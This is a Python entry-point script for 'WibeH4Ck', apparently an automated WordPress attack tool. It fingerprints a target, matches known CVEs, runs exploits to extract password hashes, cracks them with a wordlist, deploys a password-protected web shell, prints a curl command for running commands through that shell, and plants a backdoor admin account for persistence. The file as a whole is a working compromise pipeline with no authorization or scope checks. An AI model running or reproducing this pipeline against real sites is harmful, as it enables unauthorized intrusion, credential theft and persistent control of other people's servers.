# language: python, file: wibeh4ck.py
#!/usr/bin/env python3
import argparse, os, sys

from core.output import (clear_console, reset_report, write_report,
                         phase, info, ok, warn, fail, detail, kv)
from core import update as U
from core.http import HTTP
from core.output import export_json
from recon.fingerprint import fingerprint
from exploit import match_vulns, run_exploit
from post.crack import crack_hashes
from post.shell import deploy_shell
from post.persist import create_admin


def _default_wordlist():
    for p in ("wordlists/rockyou.txt", "wordlists/wordlist.txt"):
        if os.path.isfile(p):
            return p
    return "wordlists/wordlist.txt"


def build_parser():
    ap = argparse.ArgumentParser(prog="wibeh4ck",
        description="WibeH4Ck — WordPress pentest pipeline")
    ap.add_argument("-t", "--target")
    ap.add_argument("--proxy")
    ap.add_argument("--user")
    ap.add_argument("--password")
    ap.add_argument("--shell-password")
    ap.add_argument("--db", default="data/wordfence.json")
    ap.add_argument("--wordlist", default=_default_wordlist())
    ap.add_argument("--phase",
        choices=["recon","match","exploit","crack","shell","persist","all"],
        default="all")
    ap.add_argument("--skip", action="append", default=[])
    ap.add_argument("-o", "--output")
    ap.add_argument("--update", action="store_true",
        help="pull latest code + fetch missing data files, then exit")
    ap.add_argument("--no-clear", action="store_true",
        help="don't clear the console at start")
    return ap


def do_update():
    phase("update")
    root = os.path.dirname(os.path.abspath(__file__))
    os.chdir(root)

    detail("code")
    updated, msg = U.update_code(root)
    if updated is True:
        ok(f"git pull: {msg.splitlines()[-1] if msg else 'up to date'}")
    elif updated is False:
        warn(f"git pull: {msg[:200]}")
    else:
        detail(msg)

    detail("files")
    changed, same, errors = U.update_files(root)
    for f in changed: ok(f"updated  {f}")
    for f in same:    detail(f"same     {f}")
    for f, e in errors: warn(f"error    {f}: {e}")

    detail("data")
    U.ensure_data(root, log_detail=detail, log_ok=ok, log_warn=warn)

    ok("\nupdate complete")


def _run(args, state):
    http = HTTP(proxy=args.proxy)

    def allowed(name):
        return name not in args.skip and (args.phase == "all" or args.phase == name)

    # 1. recon
    if allowed("recon"):
        phase("1/6 recon")
        try:
            fp = fingerprint(args.target, http)
            state["fingerprint"] = fp
            kv("wp_version", fp.get("wp_version"))
            kv("plugins",    len(fp["plugins"]))
            kv("themes",     len(fp["themes"]))
            kv("users",      len(fp["users"]))
            kv("waf",        fp.get("waf"))
            ok("recon ok")
            state["phases"].append("recon")
        except Exception as e:
            fail(f"recon failed: {e}")
            return

    # 2. match
    if allowed("match") and "fingerprint" in state:
        phase("2/6 match")
        try:
            vulns = match_vulns(state["fingerprint"], args.db)
            state["vulns"] = vulns
            info(f"{len(vulns)} candidate(s)")
            for v in vulns[:8]:
                detail(f"cvss={v.get('cvss')}  {v.get('cve')}  {v.get('title','')[:64]}")
            state["phases"].append("match")
        except Exception as e:
            fail(f"match failed: {e}")
            return

    # 3. exploit
    hashes = {}
    if allowed("exploit") and state.get("vulns"):
        phase("3/6 exploit")
        for v in state["vulns"]:
            detail(f"try {v.get('cve')}")
            try:
                r = run_exploit(v, args.target, http)
            except Exception as e:
                warn(f"{v.get('cve')} threw: {e}")
                continue
            if r.get("success"):
                ok(f"hit {v.get('cve')}")
                for u, h in r.get("hashes", {}).items():
                    hashes[u] = h
                    detail(f"{u} : {h[:34]}...")
                state["phases"].append("exploit")
                break
            else:
                detail(f"miss: {r.get('error','no')}")
        state["hashes"] = hashes

    # 4. crack
    if allowed("crack") and hashes:
        phase(f"4/6 crack ({len(hashes)})")
        try:
            cracked = crack_hashes(hashes, args.wordlist)
            if "__error__" in cracked:
                warn(cracked["__error__"])
            else:
                state["cracked"] = cracked
                for u, pw in cracked.items():
                    ok(f"CRACKED  {u} : {pw}")
                if cracked:
                    state["phases"].append("crack")
        except Exception as e:
            fail(f"crack failed: {e}")

    # 5. shell
    user, pw = args.user, args.password
    if not (user and pw) and state.get("cracked"):
        user, pw = next(iter(state["cracked"].items()))

    if allowed("shell") and user and pw:
        phase(f"5/6 login+shell ({user})")
        try:
            shell_pw = args.shell_password or "Wibe_" + os.urandom(4).hex()
            r = deploy_shell(args.target, HTTP(proxy=args.proxy), user, pw, shell_pw)
            state["shell"] = r
            if r.get("success"):
                ok("shell deployed")
                kv("URL",  r["url"])
                kv("PASS", r["password"])
                detail(f"curl -d 'auth={r['password']}&cmd=id' {r['url']}")
                state["phases"].append("shell")
            else:
                fail(f"shell failed: {r.get('error')}")
        except Exception as e:
            fail(f"shell failed: {e}")

    # 6. persist
    if allowed("persist") and state.get("shell", {}).get("success"):
        phase("6/6 persist")
        try:
            r = create_admin(args.target, HTTP(proxy=args.proxy),
                             state["shell"]["url"], state["shell"]["password"])
            if r.get("success"):
                ok("backup admin created")
                kv("USER",  r["user"])
                kv("PASS",  r["password"])
                kv("LOGIN", r["login_url"])
                state["persist"] = r
                state["phases"].append("persist")
            else:
                fail(f"persist failed: {r.get('error')}")
        except Exception as e:
            fail(f"persist failed: {e}")


def _finish(args, state):
    phase("summary")
    for k in ("fingerprint", "vulns", "hashes", "cracked", "shell", "persist"):
        if k in state:
            ok(f"{k}")

    sh = state.get("shell") or {}
    if sh.get("success"):
        kv("SHELL", sh["url"])
        kv("PASS",  sh["password"])

    if args.output:
        export_json(args.output, state)
        detail(f"saved {args.output}")

    path = write_report(args.target, state)
    ok(f"report {path}")


def main():
    ap = build_parser()
    args = ap.parse_args()

    if args.update:
        if not args.no_clear:
            clear_console()
        reset_report()
        do_update()
        sys.exit(0)

    if not args.target:
        ap.error("--target required (or use --update)")

    if not args.no_clear:
        clear_console()
    reset_report()

    phase("WibeH4Ck")
    kv("target", args.target)
    kv("phase",  args.phase)

    state = {"target": args.target, "phases": []}
    try:
        _run(args, state)
    except KeyboardInterrupt:
        warn("interrupted")
    except Exception as e:
        fail(f"fatal: {e}")
        import traceback
        traceback.print_exc()

    try:
        _finish(args, state)
    except Exception as e:
        fail(f"report write failed: {e}")

    sys.exit(0)


if __name__ == "__main__":
    main()
